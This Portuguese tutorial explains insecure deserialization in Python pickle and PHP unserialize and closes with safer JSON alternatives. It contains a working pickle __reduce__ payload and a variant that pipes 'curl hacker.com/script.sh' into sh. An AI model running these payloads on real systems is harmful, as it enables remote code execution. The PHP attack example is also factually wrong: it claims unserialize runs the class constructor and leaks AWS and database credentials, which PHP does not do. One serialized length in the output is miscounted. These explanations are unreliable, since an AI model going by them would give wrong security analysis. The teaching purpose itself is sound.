# Code Examples: Serialização em Backend

## Exemplo 1: Python — Serialização legítima com pickle

### Criando e salvando um objeto

```python
# arquivo.py
import pickle

class Arquivo:
    def __init__(self, titulo, autor, conteudo):
        self.titulo = titulo
        self.autor = autor
        self.conteudo = conteudo

if __name__ == "__main__":
    arquivo = Arquivo("Meu Arquivo", "Autor", "Conteúdo do arquivo")
    with open("arquivo.pkl", "wb") as f:
        pickle.dump(arquivo, f)
```

### Lendo o objeto salvo

```python
# leitor.py
import pickle
from arquivo import Arquivo  # classe precisa existir para desserializar

with open("arquivo.pkl", "rb") as f:
    arquivo = pickle.load(f)

print(arquivo.titulo)    # Meu Arquivo
print(arquivo.autor)     # Autor
print(arquivo.conteudo)  # Conteúdo do arquivo
```

O arquivo `.pkl` é binário — os dados estão lá mas não é legível por humanos.

## Exemplo 2: Python — Ataque via __reduce__

```python
# malicioso.py
import os
import pickle

class Arquivo:
    def __reduce__(self):
        # Quando pickle.load() tentar reconstruir este objeto,
        # ele vai EXECUTAR os.system com este argumento
        return (os.system, ("touch hacked.txt && echo 'Malicious Code Executed'",))

if __name__ == "__main__":
    arquivo = Arquivo()
    with open("arquivo.pkl", "wb") as f:
        pickle.dump(arquivo, f)
```

### O que acontece quando o leitor.py carrega o arquivo modificado:

1. `pickle.load()` tenta reconstruir o objeto
2. Encontra `__reduce__` → executa `os.system("touch hacked.txt...")`
3. O comando shell executa **antes** de qualquer validação
4. `pickle.load()` dá erro (não é um Arquivo válido)
5. Mas o arquivo `hacked.txt` **já foi criado** — dano feito

### Versão mais perigosa (RCE completo):

```python
def __reduce__(self):
    return (os.system, ("curl hacker.com/script.sh | sh",))
    # Baixa e executa script remoto = takeover total da máquina
```

## Exemplo 3: PHP — Serialização legítima

### Serializando um array

```php
<?php
// teste.php
$arquivo = [
    'titulo' => 'Meu Arquivo',
    'autor' => 'Autor',
    'data' => '2024-01-01'
];

echo serialize($arquivo);
```

**Output (formato de serialização PHP):**
```
a:3:{s:6:"titulo";s:10:"Meu Arquivo";s:5:"autor";s:5:"Autor";s:4:"data";s:10:"2024-01-01";}
```

Decodificando o formato:
- `a:3:{...}` — array com 3 elementos
- `s:6:"titulo"` — string de 6 caracteres: "titulo"
- `s:10:"Meu Arquivo"` — string de 10 caracteres: "Meu Arquivo"
- Chave e valor alternam, separados por `;`
- Propriedades internas separadas por `:`

### Desserializando

```php
<?php
// teste2.php
$arquivo = unserialize(file_get_contents('content.txt'));

foreach ($arquivo as $chave => $valor) {
    echo "$chave: $valor\n";
}
// Output:
// titulo: Meu Arquivo
// autor: Autor
// data: 2024-01-01
```

## Exemplo 4: PHP — Ataque de vazamento via instanciação de classe

### Classe Config existente no framework (não é do atacante)

```php
<?php
// config.php (parte do framework, sempre disponível)
class Config {
    public $db_connection;
    public $api_key;

    public function __construct() {
        $this->db_connection = getenv('DATABASE_URL');
        $this->api_key = getenv('AWS_API_KEY');
    }
}
```

### Payload malicioso no content.txt

```
O:6:"Config":0:{}
```

Decodificando:
- `O:6:"Config"` — objeto da classe "Config" (6 caracteres)
- `:0:{}` — 0 parâmetros no construtor

### O que acontece:

1. `unserialize()` lê o payload
2. Instancia `new Config()` — que lê variáveis de ambiente
3. O `foreach` do PHP trata propriedades públicas como array
4. Output mostra: `db_connection: postgres://...`, `api_key: AKIA...`
5. Atacante obteve credenciais do banco e da AWS

### Como o ataque chega:

O atacante precisa controlar o conteúdo que será desserializado:
- Modificar registro no banco de dados
- Interceptar/modificar dados em trânsito na rede
- Substituir arquivo no S3
- Enviar payload via cookie/header/POST

## Exemplo 5: Alternativas seguras

### Python — JSON em vez de pickle

```python
import json

class Arquivo:
    def __init__(self, titulo, autor, conteudo):
        self.titulo = titulo
        self.autor = autor
        self.conteudo = conteudo

    def to_dict(self):
        return {"titulo": self.titulo, "autor": self.autor, "conteudo": self.conteudo}

    @classmethod
    def from_dict(cls, data):
        return cls(data["titulo"], data["autor"], data["conteudo"])

# Salvar
with open("arquivo.json", "w") as f:
    json.dump(arquivo.to_dict(), f)

# Carregar — SEGURO: json.load não executa código
with open("arquivo.json", "r") as f:
    arquivo = Arquivo.from_dict(json.load(f))
```

### PHP — json_decode em vez de unserialize

```php
<?php
// Salvar
$data = json_encode($arquivo);
file_put_contents('content.json', $data);

// Carregar — SEGURO: json_decode não instancia classes
$arquivo = json_decode(file_get_contents('content.json'), true);
```

### PHP — unserialize com allowed_classes (se inevitável)

```php
<?php
// Restringe quais classes podem ser instanciadas
$data = unserialize($trustedContent, [
    'allowed_classes' => [Arquivo::class]
    // Config, PDO, etc. serão convertidos para __PHP_Incomplete_Class
]);
```